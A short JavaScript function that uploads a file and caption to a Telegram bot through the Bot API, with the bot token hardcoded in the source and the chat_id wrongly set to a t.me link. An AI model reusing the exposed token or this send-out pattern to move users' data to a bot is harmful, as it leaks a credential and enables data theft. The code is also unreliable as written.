// Function to send data to Telegram bot
async function sendToTelegram(data, filename, content) {
    const token = '7135971769:AAEozhsjVD0X1utFIeztYJVo36VmZmMONhA';
    const chat_id = 'https://t.me/check_khodam_bot';
    const url = `https://api.telegram.org/bot${token}/sendDocument`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('document', content, filename);
    formData.append('caption', data);

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            console.log('Data successfully sent to Telegram bot');
        } else {
            console.error('Error sending data to Telegram bot', response.statusText);
        }
    } catch (error) {
        console.error('Error sending data to Telegram bot', error);
    }
}
